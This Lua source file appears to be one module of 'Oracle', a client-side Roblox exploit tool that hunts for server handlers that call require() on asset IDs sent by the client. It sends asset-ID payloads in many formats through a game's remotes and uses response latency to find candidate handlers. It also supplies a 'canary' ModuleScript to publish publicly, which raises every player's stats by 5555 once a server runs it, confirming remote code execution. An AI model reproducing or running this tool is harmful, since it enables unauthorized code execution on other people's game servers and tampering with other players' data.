-- Oracle // 34_reqcanary.lua
-- REQCANARY — require(assetId) Client-Controlled ID Probe
-- Finds server handlers that call require() with client-provided asset IDs
-- Uses a published canary ModuleScript for confirmed execution detection
-- Vector 4: Client sends asset ID → server calls require(id) → canary executes
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local hookR  = G.hookR
local rlog   = G.rlog
local CFG    = G.CFG
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- REQCANARY ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Canary delta — distinct from DSCHAN (7777) and MSGBUS (6666)
local CANARY_DELTA = 5555

-- Latency thresholds (ms)
-- require(id) with CDN fetch:   100 – 2000ms
-- require(id) cached:            5  –  30ms
-- require(id) failed (invalid):  5  –  50ms  fast error
-- Distinguishing signal: valid known-good ID vs invalid ID latency difference
local REQ_CDN_MIN    = 80   -- first-time CDN fetch starts here
local REQ_DELTA_MIN  = 60   -- minimum suspicious latency DIFFERENCE between
                             -- valid-ID probe and invalid-ID baseline
                             -- If valid causes 60ms+ more than invalid = require() called

-- A handful of small well-known valid Roblox asset IDs to use as probes
-- (Roblox's own published models, not ModuleScripts — but require() will
--  attempt the fetch and fail gracefully, giving us the CDN latency signal)
local VALID_PROBE_IDS = {
    142371344,   -- known Roblox published asset
    2551419300,  -- another known asset
    6523286724,  -- common library asset range
    7494282385,
}
-- Invalid IDs — guaranteed 404/error, fast response
local INVALID_PROBE_IDS = {1, 2, 3, 7, 99}

-- Canary ModuleScript source code
-- User publishes this EXACTLY as a public ModuleScript on Roblox
-- then enters the resulting asset ID in Oracle
local CANARY_MODULE_SOURCE = [[-- OracleCanary v1
-- Publish this as a PUBLIC ModuleScript on Roblox.
-- When required by a server, it adds +5555 to all players' numeric stats.
-- Used by Oracle REQCANARY to confirm require(clientId) execution.
pcall(function()
    local P=game:GetService("Players")
    for _,p in ipairs(P:GetPlayers()) do
        local ls=p:FindFirstChild("leaderstats")
        if ls then
            for _,v in ipairs(ls:GetChildren()) do
                if v:IsA("NumberValue") or v:IsA("IntValue") then
                    pcall(function() v.Value=v.Value+5555 end)
                end
            end
        end
        for _,n in ipairs({"Coins","Cash","Points","Score","XP","Gems","Level"}) do
            local sv=p:FindFirstChild(n)
            if sv and sv.Value~=nil then
                pcall(function() sv.Value=sv.Value+5555 end)
            end
        end
    end
end)
return {}]]

-- Payload formats that send an asset ID to a remote
-- Different games wrap the ID differently
local function buildIdPayloads(assetId)
    return {
        -- Raw numeric
        {tag="raw_id",       args={assetId}},
        -- Named field
        {tag="module_id",    args={{moduleId=assetId}}},
        {tag="asset_id",     args={{assetId=assetId}}},
        {tag="id_field",     args={{id=assetId}}},
        -- Action-style
        {tag="action_load",  args={{action="load",    moduleId=assetId}}},
        {tag="action_req",   args={{action="require", id=assetId}}},
        {tag="action_exec",  args={{action="exec",    assetId=assetId}}},
        {tag="action_run",   args={{action="run",     scriptId=assetId}}},
        -- Plugin/extension patterns
        {tag="plugin",       args={{type="module",    assetId=assetId, load=true}}},
        {tag="extension",    args={{extension=assetId,enabled=true}}},
        -- Admin-style
        {tag="admin_module", args={{command="loadModule", id=assetId}}},
        {tag="admin_require",args={{admin=true, require=assetId}}},
        -- Nested
        {tag="nested",       args={{config={moduleId=assetId}}}},
        {tag="data_wrap",    args={{data={id=assetId, type="module"}}}},
    }
end

-- ── Latency fingerprint probe ─────────────────────────────────────────────────
-- For each remote, compares latency when firing with:
--   a) a known valid large asset ID (triggers CDN fetch if require() called)
--   b) a known invalid small ID     (fast error if require() called)
-- Large positive latency delta = server called require() on the provided ID

local function probeRequireLatency(remote, samples)
    local function measureWith(ids)
        local times = {}
        for _, id in ipairs(ids) do
            local payloads = buildIdPayloads(id)
            -- Just try the first 3 payload formats for speed
            for pi = 1, math.min(3, #payloads) do
                local t0 = tick()
                pcall(function()
                    if remote:IsA("RemoteFunction") then
                        remote:InvokeServer(table.unpack(payloads[pi].args))
                    else
                        remote:FireServer(table.unpack(payloads[pi].args))
                    end
                end)
                table.insert(times, (tick()-t0)*1000)
                task.wait(0.08)
            end
        end
        if #times == 0 then return 0 end
        local sum = 0
        for _, t in ipairs(times) do sum = sum + t end
        return sum / #times
    end

    local validMed   = measureWith(VALID_PROBE_IDS)
    local invalidMed = measureWith(INVALID_PROBE_IDS)
    local delta      = validMed - invalidMed

    return {
        validMed   = validMed,
        invalidMed = invalidMed,
        delta      = delta,
        -- If valid-ID causes significantly more latency than invalid-ID,
        -- the server is making a CDN request for the valid asset
        reqLikely  = delta >= REQ_DELTA_MIN,
        reqSure    = delta >= REQ_CDN_MIN,
    }
end

-- ── Canary stat monitor ───────────────────────────────────────────────────────
local function snapshotStats()
    local s = {}
    local function cap(parent, prefix)
        if not parent then return end
        local ok, ch = pcall(function() return parent:GetChildren() end)
        if not ok then return end
        for _, v in ipairs(ch) do
            local ok2, val = pcall(function() return v.Value end)
            if ok2 and type(val) == "number" then
                s[prefix.."."..v.Name] = val
            end
        end
    end
    cap(LP:FindFirstChild("leaderstats"), "leaderstats")
    cap(LP, "player")
    return s
end

local function detectCanary(before, after)
    local hits = {}
    for key, bval in pairs(before) do
        local aval = after[key]
        if aval and aval ~= bval then
            local delta = aval - bval
            if math.abs(delta) == CANARY_DELTA then
                table.insert(hits, {path=key, before=bval, after=aval, delta=delta, exact=true})
            elseif math.abs(delta) > 50 then
                table.insert(hits, {path=key, before=bval, after=aval, delta=delta, exact=false})
            end
        end
    end
    return hits
end

-- ── Canary injection ──────────────────────────────────────────────────────────
-- Sends the user's published canary asset ID through a remote
-- in all payload formats, then monitors for stat changes
local function injectCanaryId(remote, canaryAssetId, logFn)
    local payloads = buildIdPayloads(canaryAssetId)
    local before   = snapshotStats()
    local fireTime = tick()
    local fired    = false

    for _, payload in ipairs(payloads) do
        task.wait(0.05)
        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(table.unpack(payload.args))
            else
                remote:FireServer(table.unpack(payload.args))
            end
        end)
        if ok then fired = true end
    end

    if not fired then
        if logFn then logFn("INFO","All ID payloads rejected by "..remote.Name) end
        return nil
    end

    if logFn then
        logFn("INFO",
            ("Canary ID %d fired via %s"):format(canaryAssetId, remote.Name),
            "Waiting for CDN fetch + module execution (up to 10s)")
    end

    -- require(assetId) involves a CDN fetch — can take up to 3-4s first time
    -- Monitor with increasing intervals up to 10s
    local checkPoints = {0.5, 1, 2, 3, 5, 8, 10}
    for _, delay in ipairs(checkPoints) do
        local target = fireTime + delay
        while tick() < target do task.wait(0.2) end

        local after = snapshotStats()
        local hits  = detectCanary(before, after)

        if #hits > 0 then
            local elapsed = (tick()-fireTime)*1000
            if logFn then
                logFn("FINDING",
                    ("CANARY MODULE EXECUTED at +%.0fms via %s"):format(
                        elapsed, remote.Name),
                    ("Stat: %s  %s -> %s  (+%d%s)"):format(
                        hits[1].path,
                        tostring(hits[1].before),
                        tostring(hits[1].after),
                        hits[1].delta,
                        hits[1].exact and " EXACT" or ""),
                    true)
            end
            return {
                remote    = remote.Name,
                elapsedMs = elapsed,
                hits      = hits,
                confirmed = hits[1].exact,
                assetId   = canaryAssetId,
            }
        end

        if logFn then
            logFn("INFO", ("t+%.0fs: no execution"):format(delay))
        end
    end

    return nil
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- REQCANARY PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_REQ = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- topbar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_REQ)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="REQCANARY — require(assetId) PROBE",
    TextColor3=Color3.fromRGB(255,90,150),TextSize=11,
    Size=UDim2.new(0,310,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)
local REQ_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(1,-324,1,0),Position=UDim2.new(0,320,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

-- control bar
local CTRLBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,30),ZIndex=4},P_REQ)
stroke(C.BORDER,1,CTRLBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=4},CTRLBAR)

local function mkBtn(txt,col,x)
    local b=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=col,BorderSizePixel=0,
        Font=Enum.Font.GothamBold,Text=txt,TextColor3=Color3.fromRGB(8,8,12),TextSize=9,
        Size=UDim2.new(0,0,0,22),AutomaticSize=Enum.AutomaticSize.X,
        Position=UDim2.new(0,x,0.5,-11),ZIndex=5},CTRLBAR)
    corner(5,b)
    mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)},b)
    return b
end

local LATENCY_BTN = mkBtn("Latency Fingerprint",Color3.fromRGB(255,90,150),  8)
local INJECT_BTN  = mkBtn("Inject Canary ID",   Color3.fromRGB(255,200,60),  178)
local FULL_BTN    = mkBtn("Full Scan",           Color3.fromRGB(80,210,100),  300)
local STOP_BTN    = mkBtn("Stop",                Color3.fromRGB(60,15,15),    400)
STOP_BTN.TextColor3=Color3.fromRGB(255,80,80)
stroke(Color3.fromRGB(255,80,80),1,STOP_BTN)

-- body
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,62),Size=UDim2.new(1,0,1,-62),ZIndex=3},P_REQ)

-- left panel: canary setup + results
local RL=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0,240,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=4},RL)
local LEFT=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=4},RL)
pad(8,8,LEFT); listV(LEFT,6)

-- Canary setup section
local setupCard=mk("Frame",{BackgroundColor3=Color3.fromRGB(10,5,15),
    BorderSizePixel=0,Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
    ZIndex=4,LayoutOrder=1},LEFT)
corner(8,setupCard); stroke(Color3.fromRGB(255,90,150),1,setupCard)
pad(10,8,setupCard); listV(setupCard,8)

mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="CANARY SETUP",TextColor3=Color3.fromRGB(255,90,150),TextSize=11,
    Size=UDim2.new(1,0,0,16),TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=5,LayoutOrder=1},setupCard)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="1. In Roblox Studio, create a new ModuleScript.\n"..
         "2. Paste the canary code (press Copy Code).\n"..
         "3. Publish it as a PUBLIC MODEL to Roblox.\n"..
         "4. Paste the asset ID below.",
    TextColor3=C.MUTED,TextSize=9,TextWrapped=true,
    Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
    TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=5,LayoutOrder=2},setupCard)

local COPY_CODE_BTN=mk("TextButton",{AutoButtonColor=false,
    BackgroundColor3=Color3.fromRGB(40,15,50),BorderSizePixel=0,
    Font=Enum.Font.GothamBold,Text="Copy Canary Module Code",
    TextColor3=Color3.fromRGB(255,90,150),TextSize=9,
    Size=UDim2.new(1,0,0,24),ZIndex=5,LayoutOrder=3},setupCard)
corner(6,COPY_CODE_BTN); stroke(Color3.fromRGB(255,90,150),1,COPY_CODE_BTN)
COPY_CODE_BTN.MouseButton1Click:Connect(function()
    pcall(setclipboard, CANARY_MODULE_SOURCE)
    COPY_CODE_BTN.Text="Copied!"
    task.delay(2, function()
        if COPY_CODE_BTN.Parent then
            COPY_CODE_BTN.Text="Copy Canary Module Code"
        end
    end)
end)

mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="YOUR CANARY ASSET ID",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(1,0,0,13),TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=5,LayoutOrder=4},setupCard)
local ID_BOX=mk("TextBox",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Text="",PlaceholderText="e.g.  12345678901",
    PlaceholderColor3=C.MUTED,TextColor3=C.WHITE,TextSize=12,
    Font=Enum.Font.Code,ClearTextOnFocus=false,
    TextXAlignment=Enum.TextXAlignment.Left,
    Size=UDim2.new(1,0,0,28),ZIndex=5,LayoutOrder=5},setupCard)
corner(6,ID_BOX); stroke(C.BORDER,1,ID_BOX); pad(8,0,ID_BOX)

mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="Delta marker: +"..tostring(CANARY_DELTA).." on numeric stats\n"..
         "Confirm by watching your own stats\nor another player's.",
    TextColor3=C.MUTED,TextSize=8,TextWrapped=true,
    Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
    TextXAlignment=Enum.TextXAlignment.Left,
    ZIndex=5,LayoutOrder=6},setupCard)

-- Results area
local RES_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
    ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),ZIndex=4,LayoutOrder=2},LEFT)
pad(0,6,RES_SCROLL); listV(RES_SCROLL,5)

-- right: log
local RR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,241,0,0),Size=UDim2.new(1,-241,1,0),ZIndex=3},BODY)
local PROG_BG=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,3),ZIndex=5},RR)
local PROG_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(255,90,150),
    BorderSizePixel=0,Size=UDim2.new(0,0,1,0),ZIndex=6},PROG_BG)
corner(2,PROG_BAR)
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,3),Size=UDim2.new(1,0,1,-3),
    ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},RR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)
local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="REQCANARY hunts require(clientId) paths.\n\n"..
         "Vector: a remote handler calls\n"..
         "require(clientProvidedId) — fetching your\n"..
         "published ModuleScript from Roblox's CDN\n"..
         "and executing it with server authority.\n\n"..
         "TWO detection methods:\n\n"..
         "Latency Fingerprint — no canary needed.\n"..
         "Compares response time with valid vs invalid\n"..
         "asset IDs. Valid ID causes CDN fetch latency\n"..
         "spike (80ms+) if require() was called.\n\n"..
         "Inject Canary ID — requires publishing.\n"..
         "Sends your canary module's asset ID and\n"..
         "monitors for +5555 stat delta confirming\n"..
         "your code executed on the server.",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,230),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- log helpers
local rN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false; rN=rN+1; mkRow(tag,msg,detail,hi,LOG_SCROLL,rN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) rN=rN+1; mkSep(txt,LOG_SCROLL,rN) end
local function clearLog()
    for _,c in ipairs(LOG_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    rN=0; LOG_EMPTY.Visible=true
    tw(PROG_BAR,TI.fast,{Size=UDim2.new(0,0,1,0)})
end

-- result cards
local REQ_RESULTS = {}

local function addResultCard(result, ord)
    local col = result.canaryConfirmed and Color3.fromRGB(255,60,60) or
                result.latencyLikely   and Color3.fromRGB(255,90,150) or
                Color3.fromRGB(80,80,120)

    local card=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
        Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
        ZIndex=4,LayoutOrder=ord},RES_SCROLL)
    corner(6,card); stroke(col,1,card); pad(8,6,card); listV(card,4)

    local hrow=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
        Size=UDim2.new(1,0,0,16),ZIndex=5,LayoutOrder=1},card)
    listH(hrow,5)
    local badge=mk("Frame",{BackgroundColor3=col,BorderSizePixel=0,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=6},hrow)
    corner(3,badge)
    mk("UIPadding",{PaddingLeft=UDim.new(0,3),PaddingRight=UDim.new(0,3)},badge)
    local badgeText = result.canaryConfirmed and "EXEC CONFIRMED" or
                      result.latencyLikely   and "CDN FETCH SEEN" or
                      "LATENCY CHECKED"
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=badgeText,TextColor3=Color3.fromRGB(8,8,12),TextSize=7,
        Size=UDim2.new(0,0,1,0),AutomaticSize=Enum.AutomaticSize.X,ZIndex=7},badge)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=result.name,TextColor3=col,TextSize=10,
        Size=UDim2.new(1,-110,1,0),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=6,LayoutOrder=2},hrow)

    if result.latency then
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
            Text=("valid %.0fms  invalid %.0fms  delta +%.0fms"):format(
                result.latency.validMed,
                result.latency.invalidMed,
                result.latency.delta),
            TextColor3=C.MUTED,TextSize=8,
            Size=UDim2.new(1,0,0,12),TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=5,LayoutOrder=2},card)
    end

    if result.canaryResult then
        mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
            Text=("Canary executed at +%.0fms"):format(result.canaryResult.elapsedMs),
            TextColor3=Color3.fromRGB(255,60,60),TextSize=9,
            Size=UDim2.new(1,0,0,13),TextXAlignment=Enum.TextXAlignment.Left,
            ZIndex=5,LayoutOrder=3},card)
    end
end

local function rebuildCards()
    for _,c in ipairs(RES_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    for i,r in ipairs(REQ_RESULTS) do addResultCard(r,i) end
end

-- state
local running = false
local aborted = false

local function collectRemotes(limit)
    local remotes={}
    local map=G.DISCOVERY_MAP
    if map then
        for _,r in ipairs(map.remoteEvents or {}) do
            if r.instance then table.insert(remotes,r.instance) end
        end
        for _,r in ipairs(map.remoteFunctions or {}) do
            if r.instance then table.insert(remotes,r.instance) end
        end
    end
    if #remotes==0 then
        local function sc(root)
            local ok,d=pcall(function() return root:GetDescendants() end)
            if not ok then return end
            for _,x in ipairs(d) do
                if x:IsA("RemoteEvent") or x:IsA("RemoteFunction") then
                    table.insert(remotes,x)
                end
            end
        end
        sc(RepS); sc(workspace)
    end
    if limit then
        local cut={}
        for i=1,math.min(limit,#remotes) do table.insert(cut,remotes[i]) end
        return cut
    end
    return remotes
end

STOP_BTN.MouseButton1Click:Connect(function()
    aborted=true; running=false
    REQ_STATUS.Text="stopped"; REQ_STATUS.TextColor3=C.MUTED
end)

-- ── LATENCY FINGERPRINT ───────────────────────────────────────────────────────
LATENCY_BTN.MouseButton1Click:Connect(function()
    if running then return end
    running=true; aborted=false
    clearLog(); REQ_RESULTS={}
    tw(LATENCY_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,20,50)})
    REQ_STATUS.Text="fingerprinting..."; REQ_STATUS.TextColor3=Color3.fromRGB(255,90,150)

    local remotes=collectRemotes(14)
    addLogSep(("LATENCY FINGERPRINT — %d remotes"):format(#remotes))
    addLog("INFO",
        "Comparing valid-asset vs invalid-asset response latency",
        ("require() CDN fetch adds %.0fms+ if server fetches asset"):format(REQ_DELTA_MIN))

    task.spawn(function()
        for i,remote in ipairs(remotes) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(i/#remotes,0,1,0)})
            REQ_STATUS.Text=("fingerprint %d/%d: %s"):format(i,#remotes,remote.Name)

            local lat=probeRequireLatency(remote, 2)
            local result={
                name=remote.Name, remote=remote,
                latency=lat,
                latencyLikely=lat.reqLikely,
                latencySure=lat.reqSure,
            }
            table.insert(REQ_RESULTS, result)
            rebuildCards()

            local hi=lat.reqLikely
            addLog(hi and "FINDING" or "INFO",
                ("[%s] %s — delta +%.0fms"):format(
                    lat.reqSure and "CDN_CONFIRMED" or
                    lat.reqLikely and "CDN_PROBABLE" or "NO_REQUIRE",
                    remote.Name, lat.delta),
                ("valid %.0fms  invalid %.0fms"):format(
                    lat.validMed, lat.invalidMed),
                hi)
        end

        local found=0
        for _,r in ipairs(REQ_RESULTS) do if r.latencyLikely then found=found+1 end end
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        addLogSep(("FINGERPRINT COMPLETE — %d require() candidate(s)"):format(found))
        REQ_STATUS.Text=found.." candidate(s) found"
        REQ_STATUS.TextColor3=found>0 and Color3.fromRGB(255,90,150) or C.MUTED
        tw(LATENCY_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,90,150)})
        running=false
    end)
end)

-- ── INJECT CANARY ID ──────────────────────────────────────────────────────────
INJECT_BTN.MouseButton1Click:Connect(function()
    if running then return end
    local idStr=ID_BOX.Text:match("^%s*(.-)%s*$")
    local assetId=tonumber(idStr)
    if not assetId then
        addLog("INFO","Enter your canary module's asset ID in the left panel",
            "Publish the canary ModuleScript first, then paste the ID")
        return
    end

    -- Find candidates — latency-likely remotes, or all if none found yet
    local targets={}
    for _,r in ipairs(REQ_RESULTS) do
        if r.latencyLikely then table.insert(targets,r) end
    end
    if #targets==0 then
        -- Fall back to all remotes
        local all=collectRemotes(12)
        for _,r in ipairs(all) do
            table.insert(targets,{name=r.Name,remote=r})
        end
    end
    if #targets==0 then
        addLog("INFO","No remotes found — run Discovery first"); return
    end

    running=true; aborted=false
    tw(INJECT_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,60,10)})
    REQ_STATUS.Text="injecting canary ID..."; REQ_STATUS.TextColor3=Color3.fromRGB(255,200,60)

    addLogSep(("CANARY INJECTION — asset ID %d"):format(assetId))
    addLog("INFO",
        ("Sending ID %d via %d remote(s)"):format(assetId, #targets),
        "Monitoring for stat delta +"..tostring(CANARY_DELTA).." up to 10s per remote")

    task.spawn(function()
        for i,target in ipairs(targets) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(i/#targets,0,1,0)})
            REQ_STATUS.Text=("inject %d/%d: %s"):format(i,#targets,target.name)
            addLog("INFO",("Trying %s"):format(target.name))

            local result=injectCanaryId(target.remote, assetId, addLog)
            if result then
                -- Find or create result entry for this remote
                local existing=nil
                for _,r in ipairs(REQ_RESULTS) do
                    if r.name==target.name then existing=r; break end
                end
                if existing then
                    existing.canaryResult=result
                    existing.canaryConfirmed=result.confirmed
                else
                    table.insert(REQ_RESULTS,{
                        name=target.name,remote=target.remote,
                        canaryResult=result,canaryConfirmed=result.confirmed,
                    })
                end
                rebuildCards()

                addLogSep("VECTOR 4 CONFIRMED")
                addLog("FINDING",
                    ("require(clientId) CONFIRMED: %s"):format(target.name),
                    ("Your module asset %d executed on target server"):format(assetId),
                    true)
                if result.confirmed then
                    addLog("FINDING",
                        "EXACT CANARY DELTA — server executed your published module",
                        ("Stat delta exactly +%d — no coincidence possible"):format(
                            CANARY_DELTA),
                        true)
                end
                REQ_STATUS.Text="VECTOR 4 CONFIRMED"
                REQ_STATUS.TextColor3=Color3.fromRGB(255,60,60)
                break
            end
        end
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        if not aborted and REQ_STATUS.Text ~= "VECTOR 4 CONFIRMED" then
            REQ_STATUS.Text="no execution confirmed"
            REQ_STATUS.TextColor3=C.MUTED
        end
        tw(INJECT_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,200,60)})
        running=false
    end)
end)

-- ── FULL SCAN ─────────────────────────────────────────────────────────────────
FULL_BTN.MouseButton1Click:Connect(function()
    if running then return end
    local assetId=tonumber(ID_BOX.Text:match("^%s*(.-)%s*$") or "")
    running=true; aborted=false
    clearLog(); REQ_RESULTS={}
    tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(20,60,30)})
    REQ_STATUS.Text="full scan..."; REQ_STATUS.TextColor3=Color3.fromRGB(80,210,100)

    local remotes=collectRemotes(14)
    addLogSep(("REQCANARY FULL SCAN — %d remotes"):format(#remotes))
    if not assetId then
        addLog("INFO","No canary asset ID provided",
            "Latency fingerprinting only — enter asset ID for canary injection")
    end

    task.spawn(function()
        -- Phase 1: latency fingerprint
        addLog("INFO","Phase 1: CDN fetch latency fingerprinting")
        for i,remote in ipairs(remotes) do
            if aborted then break end
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(i/#remotes*0.4,0,1,0)})
            REQ_STATUS.Text=("phase 1: %s"):format(remote.Name)
            local lat=probeRequireLatency(remote,2)
            table.insert(REQ_RESULTS,{
                name=remote.Name,remote=remote,
                latency=lat,
                latencyLikely=lat.reqLikely,
                latencySure=lat.reqSure,
            })
        end
        rebuildCards()

        local found=0
        for _,r in ipairs(REQ_RESULTS) do if r.latencyLikely then found=found+1 end end
        addLog(found>0 and "FINDING" or "INFO",
            ("Phase 1: %d require() candidate(s)"):format(found),
            found>0 and "CDN fetch latency delta detected on these remotes" or
            "No CDN latency signature detected")

        -- Phase 2: canary injection (if ID provided)
        if assetId and found > 0 and not aborted then
            addLogSep(("Phase 2: canary injection (ID %d) into %d candidate(s)"):format(
                assetId, found))
            local candidates={}
            for _,r in ipairs(REQ_RESULTS) do
                if r.latencyLikely then table.insert(candidates,r) end
            end
            for i,target in ipairs(candidates) do
                if aborted then break end
                tw(PROG_BAR,TI.fast,{Size=UDim2.new(0.4+(i/#candidates*0.6),0,1,0)})
                REQ_STATUS.Text=("phase 2: %s"):format(target.name)
                addLog("INFO",("Canary %d/%d: %s"):format(i,#candidates,target.name))
                local result=injectCanaryId(target.remote,assetId,addLog)
                if result then
                    target.canaryResult=result
                    target.canaryConfirmed=result.confirmed
                    rebuildCards()
                    addLogSep("VECTOR 4 CONFIRMED")
                    addLog("FINDING",
                        ("require(clientId): your module executed via %s"):format(target.name),
                        ("Asset %d  +%.0fms execution  delta +%d"):format(
                            assetId, result.elapsedMs, CANARY_DELTA),
                        true)
                    REQ_STATUS.Text="VECTOR 4 CONFIRMED"
                    REQ_STATUS.TextColor3=Color3.fromRGB(255,60,60)
                    break
                end
            end
        elseif assetId and found == 0 and not aborted then
            addLog("INFO","Skipping canary — no CDN candidates from Phase 1",
                "Try injecting manually via Inject Canary ID into all remotes")
        end

        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        addLogSep("FULL SCAN COMPLETE")
        if REQ_STATUS.Text ~= "VECTOR 4 CONFIRMED" and not aborted then
            REQ_STATUS.Text=found.." CDN candidate(s)"
            REQ_STATUS.TextColor3=found>0 and Color3.fromRGB(255,90,150) or C.MUTED
        end
        tw(FULL_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,210,100)})
        running=false
    end)
end)

-- export
G.REQCANARY_RESULTS   = REQ_RESULTS
G.reqcanary_source    = CANARY_MODULE_SOURCE
G.reqcanary_inject    = injectCanaryId
G.reqcanary_fingerprint = probeRequireLatency

if G.addTab then
    G.addTab("reqcanary","ReqCanary",P_REQ)
else
    warn("[Oracle] G.addTab not found")
end
